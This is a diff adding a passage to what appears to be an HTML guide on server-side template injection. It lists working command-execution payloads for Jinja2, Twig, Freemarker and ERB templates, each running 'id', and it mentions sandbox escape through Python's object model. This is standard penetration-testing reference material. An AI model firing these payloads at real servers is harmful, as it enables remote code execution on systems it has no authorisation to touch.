@@ -123,6 +123,14 @@ tplmap -u 'https://target/page?name=*'        # detect + exploit, many engines
 <p>The sandboxes many engines ship (Twig sandbox, Jinja2 sandboxed environment)
 are routinely escapable, so treat confirmed SSTI as RCE-equivalent until proven
 otherwise.</p>
+<p>Each engine has a canonical path from evaluation to command execution &mdash;
+these are the well-known primitives (a tool picks the version-correct variant):</p>
+<pre><code>Jinja2 (Python)   {{ cycler.__init__.__globals__.os.popen('id').read() }}
+Twig (PHP)        {{ ['id']|filter('system') }}
+Freemarker (Java) ${"freemarker.template.utility.Execute"?new()("id")}
+ERB (Ruby)        &lt;%= `id` %&gt;</code></pre>
+<p>Where a sandbox blocks the direct call, the climb goes through the object model
+(the <code>__mro__</code> walk above) to reach an unsandboxed callable.</p>
 
 <h2>Engine fingerprint</h2>
 <table>
